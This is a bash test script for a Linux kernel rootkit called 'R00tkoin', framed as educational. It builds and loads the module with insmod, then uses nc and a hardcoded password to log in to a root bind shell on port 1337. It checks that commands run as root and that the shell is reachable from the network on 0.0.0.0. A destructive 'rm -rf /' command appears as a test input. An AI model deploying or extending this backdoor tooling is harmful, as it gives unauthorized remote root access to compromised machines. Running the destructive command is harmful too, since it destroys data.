#!/bin/bash

# R00tkoin Real Shell Test Script
# Tests the actual shell functionality of the rootkit

BIND_PORT=1337
BIND_HOST="127.0.0.1"
PASSWORD="r00tkoinFTW1337"
MODULE_NAME="r00tkoin"

echo "=== R00tkoin Real Shell Test ==="
echo "Testing interactive shell with real command execution"
echo

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

test_count=0
pass_count=0

run_test() {
    local test_name="$1"
    local expected="$2"
    shift 2
    local result
    
    ((test_count++))
    echo -n "Test $test_count: $test_name... "
    
    result=$("$@" 2>&1)
    
    if [[ "$result" == *"$expected"* ]]; then
        echo -e "${GREEN}PASS${NC}"
        ((pass_count++))
        return 0
    else
        echo -e "${RED}FAIL${NC}"
        echo "  Expected: $expected"
        echo "  Got: $result"
        return 1
    fi
}

# Function to send command to shell and get response
send_shell_command() {
    local cmd="$1"
    local timeout="${2:-5}"
    
    {
        echo "$PASSWORD"
        sleep 1
        echo "$cmd"
        sleep 2
        echo "exit"
    } | timeout $timeout nc "$BIND_HOST" "$BIND_PORT" 2>/dev/null | tail -n +4 | head -n -2
}

echo "Step 1: Building and loading the rootkit..."
make clean >/dev/null 2>&1
if ! make >/dev/null 2>&1; then
    echo -e "${RED}Failed to build rootkit${NC}"
    exit 1
fi

if ! sudo insmod r00tkoin.ko >/dev/null 2>&1; then
    echo -e "${RED}Failed to load rootkit${NC}"
    exit 1
fi
echo -e "${GREEN}Rootkit loaded successfully${NC}"

# Wait for bind shell to start
echo "Waiting for bind shell to initialize..."
sleep 3

echo "Step 2: Testing real shell commands..."

# Test basic commands
run_test "whoami command" "root" send_shell_command "whoami"
run_test "pwd command" "/" send_shell_command "pwd"
run_test "uname command" "Linux" send_shell_command "uname"
run_test "date command" "202" send_shell_command "date"
run_test "id command" "uid=0" send_shell_command "id"

# Test file system commands
run_test "ls /bin (partial)" "bash" send_shell_command "ls /bin | head -5"
run_test "ls /usr/bin (partial)" "awk" send_shell_command "ls /usr/bin | head -5"
run_test "cat /proc/version" "Linux version" send_shell_command "cat /proc/version"

# Test process commands
run_test "ps command" "PID" send_shell_command "ps"
run_test "ps aux (limited)" "root" send_shell_command "ps aux | head -3"

# Test rootkit-specific commands
run_test "rootkit help command" "R00tkoin v1.0 Rootkit Shell" send_shell_command "rootkit"
run_test "status command" "R00tkoin Status" send_shell_command "status"
run_test "help command" "Interactive Shell" send_shell_command "help"

# Test file creation and manipulation
echo "Step 3: Testing file operations..."
run_test "echo and file creation" "test123" send_shell_command "echo 'test123' > /tmp/test_r00tkoin.txt && cat /tmp/test_r00tkoin.txt"

# Test safety blocks
echo "Step 4: Testing safety features..."
result=$(send_shell_command "rm -rf /" 2>&1)
if [[ "$result" == *"Command blocked for safety"* ]]; then
    echo -e "Test $((++test_count)): Safety blocking dangerous commands... ${GREEN}PASS${NC}"
    ((pass_count++))
else
    echo -e "Test $((++test_count)): Safety blocking dangerous commands... ${RED}FAIL${NC}"
fi

# Test command length limit
result=$(send_shell_command "$(printf 'A%.0s' {1..600})" 2>&1)
if [[ "$result" == *"Command too long"* ]]; then
    echo -e "Test $((++test_count)): Command length limit... ${GREEN}PASS${NC}"
    ((pass_count++))
else
    echo -e "Test $((++test_count)): Command length limit... ${RED}FAIL${NC}"
fi

# Test network connectivity
echo "Step 5: Testing network commands..."
run_test "ping localhost (count 1)" "1 packets transmitted" send_shell_command "ping -c 1 localhost" 8

# Test environment
run_test "environment variables" "PATH" send_shell_command "env | grep PATH"

# Clean up test files
send_shell_command "rm -f /tmp/test_r00tkoin.txt" >/dev/null 2>&1

echo
echo "Step 6: Network accessibility test..."
echo "Testing network bind (shell accessible from any IP)..."
if ss -tlnp | grep -q "0.0.0.0:$BIND_PORT"; then
    echo -e "${GREEN}✓ Shell bound to 0.0.0.0:$BIND_PORT (network accessible)${NC}"
else
    echo -e "${RED}✗ Shell not bound to all interfaces${NC}"
fi

echo
echo "Step 7: Interactive demonstration..."
echo "Starting interactive session (use Ctrl+C to exit):"
echo "Password: $PASSWORD"
echo "Try commands like: whoami, ls, ps, cat /proc/version, rootkit, status"
echo -e "${YELLOW}NOTE: Shell is accessible from network - students can connect remotely!${NC}"
echo
nc "$BIND_HOST" "$BIND_PORT" || echo "Interactive session ended"

echo
echo "Step 8: Cleanup..."
if sudo rmmod "$MODULE_NAME" >/dev/null 2>&1; then
    echo -e "${GREEN}Rootkit unloaded successfully${NC}"
else
    echo -e "${RED}Failed to unload rootkit${NC}"
fi

make clean >/dev/null 2>&1

echo
echo "=== Test Summary ==="
echo -e "Total tests: $test_count"
echo -e "Passed: ${GREEN}$pass_count${NC}"
echo -e "Failed: ${RED}$((test_count - pass_count))${NC}"

if [ $pass_count -eq $test_count ]; then
    echo -e "${GREEN}All tests passed! Real shell is working perfectly.${NC}"
    echo "The rootkit now provides genuine shell access for educational purposes."
else
    echo -e "${YELLOW}Some tests failed. Please check the output above.${NC}"
fi

echo
echo "Educational Notes:"
echo "- The shell now executes real system commands with proper formatting"
echo "- File operations work with actual filesystem"
echo "- Safety features prevent dangerous operations"
echo "- Perfect for demonstrating real rootkit capabilities"
echo "- Students can explore actual system internals"
echo "- Network accessible: Students can connect from remote machines"
echo "- Proper output formatting with newlines for better readability" 